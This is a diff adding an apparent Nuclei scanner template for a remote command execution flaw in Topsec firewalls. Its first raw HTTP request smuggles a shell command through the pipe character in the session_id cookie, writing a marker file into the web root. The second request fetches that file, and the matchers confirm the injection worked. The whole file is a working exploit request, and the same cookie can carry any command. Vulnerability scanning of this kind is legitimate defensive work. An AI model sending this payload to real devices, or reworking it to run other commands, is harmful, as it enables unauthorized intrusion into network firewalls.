@@ -1,0 +1,36 @@
+id: topsec-cookie-rce
+
+info:
+  name: 天融信防火墙Cookie命令执行
+  author: Str1am
+  severity: high
+  tags: topsec,rce
+
+requests:
+  - raw:
+      - |
+        GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Cookie: session_id_443=1|echo nvgjngfszfzahgf1 > /www/htdocs/site/image/vfhds.txt
+        
+      - |
+        GET /site/image/vfhds.txt HTTP/1.1
+        Host: {{Hostname}}        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "nvgjngfszfzahgf1"
+        part: body
+        condition: and
